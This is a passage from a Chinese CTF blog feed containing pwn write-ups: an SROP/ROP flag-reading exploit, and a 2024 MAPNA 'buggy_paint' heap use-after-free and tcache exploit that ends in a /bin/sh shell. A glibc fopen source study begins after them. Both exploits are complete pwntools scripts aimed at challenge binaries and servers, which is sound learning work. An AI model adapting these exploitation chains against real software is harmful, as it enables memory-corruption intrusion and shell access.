class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line">flag=<span class="number">0x404178</span>      </span><br><span class="line">lr=<span class="number">0x40136c</span></span><br><span class="line">syscall_ret=<span class="number">0x40118A</span><span class="comment">#syscall; nop; pop rbp; ret;</span></span><br><span class="line">p=process(elf_path)     </span><br><span class="line"><span class="comment">#p=remote(&#x27;47.108.206.43&#x27;,43800)</span></span><br><span class="line">pop_rax_ret=<span class="number">0x3f587</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x27c65</span></span><br><span class="line">pop_rdx_ret=<span class="number">0xfd68d</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x29419</span></span><br><span class="line">syscall=<span class="number">0x853b2</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">r()</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax=<span class="number">1</span></span><br><span class="line">sigframe.rdi=<span class="number">0x1</span></span><br><span class="line">sigframe.rsi=<span class="number">0x403fd8</span></span><br><span class="line">sigframe.rdx=<span class="number">0x8</span></span><br><span class="line">sigframe.rip=syscall_ret</span><br><span class="line">sigframe.rsp=<span class="number">0x404460</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x404460</span>)+p64(syscall_ret)+p64(<span class="number">0x404460</span>)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;chall\0&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404460</span>)+p64(<span class="number">0x4013D4</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">r()</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">s(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x404800</span>)+p64(pop_rdi_ret+libc.address)+p64(flag)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0o777</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">0x5a</span>)+p64(syscall+libc.address)</span><br><span class="line">payload+=p64(pop_rdi_ret+libc.address)+p64(flag)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">4</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">2</span>)+p64(syscall+libc.address)</span><br><span class="line">payload+=p64(pop_rdi_ret+libc.address)+p64(<span class="number">3</span>)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0x404a00</span>)+p64(pop_rdx_ret+libc.address)+p64(<span class="number">64</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">0</span>)+p64(syscall+libc.address)</span><br><span class="line">payload+=p64(pop_rdi_ret+libc.address)+p64(<span class="number">1</span>)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0x404a00</span>)+p64(pop_rdx_ret+libc.address)+p64(<span class="number">0x40</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">1</span>)+p64(syscall+libc.address)</span><br><span class="line">s(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">r()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr))</span><br><span class="line"></span><br><span class="line">irt()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h1 id="2024MAPNA-buggy-paint"><a href="#2024MAPNA-buggy-paint" class="headerlink" title="2024MAPNA-buggy_paint"></a>2024MAPNA-buggy_paint</h1><p><strong>标签:tcache attack|UAF</strong></p><p>菜单堆体,libc是2.35版本,无seccomp</p><p>核心漏洞是</p><p>select选择一个note时,将该note删除掉,依然能进行edit,show等操作,即可uaf</p><p>通过这些可以泄露heap和libc</p><p>之后再进行tcache attack,使得tcache中的一条链无限指向其自身</p><p>依此申请的管理节点chunk与缓存可写chunk重叠</p><p>从而达到<u>任意写任意读</u></p><p>这里选择泄露environ,打rop</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;3.75.185.198&#x27;</span>,<span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">c</span>):</span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,tbs(c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">x,y,w,h,content</span>):</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;x: &#x27;</span>,tbs(x))</span><br><span class="line">sla(<span class="string">b&#x27;y: &#x27;</span>,tbs(y))</span><br><span class="line">sla(<span class="string">b&#x27;width: &#x27;</span>,tbs(w))</span><br><span class="line">sla(<span class="string">b&#x27;height: &#x27;</span>,tbs(h))</span><br><span class="line">sla(<span class="string">b&#x27;color(1=red, 2=green): &#x27;</span>,tbs(<span class="number">1</span>))</span><br><span class="line">sa(<span class="string">b&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">x,y</span>):</span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">b&#x27;x: &#x27;</span>,tbs(x))</span><br><span class="line">sla(<span class="string">b&#x27;y: &#x27;</span>,tbs(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select</span>(<span class="params">x,y</span>):</span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&#x27;x: &#x27;</span>,tbs(x))</span><br><span class="line">sla(<span class="string">b&#x27;y: &#x27;</span>,tbs(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;New content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Box content:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">heap_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">create(<span class="number">0</span>,i,<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">delete(<span class="number">0</span>,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219CE0</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">create(<span class="number">0</span>,i,<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(p64((heap_base+<span class="number">0xa90</span>)^(heap_base&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#申请不同大小,以免管理节点chunk内容被程序清空,不过其实相同也没什么影响</span></span><br><span class="line"></span><br><span class="line">note=flat(&#123;<span class="number">0x0</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x10</span>:heap_base,</span><br><span class="line"><span class="number">0x18</span>:<span class="number">8</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x28</span>:environ&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(note)</span><br><span class="line">select(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">stack=u64(r(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">select(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">note=flat(&#123;<span class="number">0x0</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="number">3</span>,</span><br><span class="line"><span class="number">0x10</span>:heap_base,</span><br><span class="line"><span class="number">0x18</span>:<span class="number">8</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">6</span>,</span><br><span class="line"><span class="number">0x28</span>:stack-<span class="number">0x120</span>&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(note)</span><br><span class="line">select(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">edit(p64(pop_rdi_ret)+p64(stack-<span class="number">0x120</span>+<span class="number">0x20</span>)+p64(libc_base+<span class="number">0x29139</span>)+p64(libc_base+system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">最近比赛中遇到的题</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="题解" scheme="https://ixout.github.io/tags/%E9%A2%98%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>file函数学习</title>
    <link href="https://ixout.github.io/posts/33400/"/>
    <id>https://ixout.github.io/posts/33400/</id>
    <published>2023-09-14T15:07:27.000Z</published>
    <updated>2023-11-30T15:16:15.818Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学堆中_IO_FILE的利用,也就是各种how2heap了</p><p>发现对_IO_FILE的具体规则及代码运用其实还不是很熟悉</p><p>恰好发现了rap-cp和桑榆两个大佬的博客文章</p><p>认真学习了一番</p><p>并记录自己的学习收获</p><p>glibc使用2.31,因为自己的ubuntu默认libc是2.31的,比较方便</p><p>版本差异导致有些代码并不能完全对应,不过问题不大</p><hr><p>很多函数的原型不太好找是因为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_proto(name, attrs...)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_tls_proto(name, attrs...)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_weak(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_ver(local, name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_tls_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_weak(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_ver(local, name)</span></span><br><span class="line"></span><br><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br></pre></td></tr></table></figure><p>等一系列原型隐藏符号映射宏</p><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><p>fopen实际上是 _IO_new_fopen函数，该函数在/libio/iofopen.c文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到_IO_new_fopen仅仅是调用了__fopen_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__fopen_internal其实就差不多已经包含了整个流程了</p><p>整个<code>__fopen_internal</code>函数包含四个部分：</p><ol><li><code>malloc</code>分配内存空间。</li><li><code>_IO_no_init</code> 对file结构体进行<code>null</code>初始化。</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li><li><code>_IO_file_fopen</code>执行系统调用打开文件。</li></ol><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>开头声明了一个结构体并实例化了一个对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> 